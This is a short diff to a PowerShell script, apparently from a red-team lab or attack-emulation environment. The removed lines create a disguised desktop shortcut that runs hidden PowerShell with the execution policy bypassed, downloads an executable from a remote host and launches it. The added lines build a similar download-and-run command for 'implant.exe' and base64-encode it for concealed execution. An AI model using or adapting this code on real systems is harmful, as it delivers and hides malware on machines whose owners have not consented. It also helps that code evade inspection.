@@ -1,6 +1,4 @@
-$obj = New-Object -ComObject WScript.Shell
-$link = $obj.CreateShortcut("C:\Users\vagrant\Desktop\PowerShell.lnk")
-$link.WindowStyle = 7
-$link.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-$link.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command (New-Object System.Net.WebClient).DownloadFile('http://10.2.10.#:8889/ msgBox.exe','C:\Windows\Temp\msgbox.exe');Start-Process 'C:\Windows\Temp\msgbox.exe'"
-$link.Save()
+$payload = "(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.50:8889/implant.exe','C:\Windows\Temp\implant.exe');Start-Process 'C:\Windows\Temp\implant.exe'"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
+$encoded = [Convert]::ToBase64String($bytes)
+Write-Output $encoded
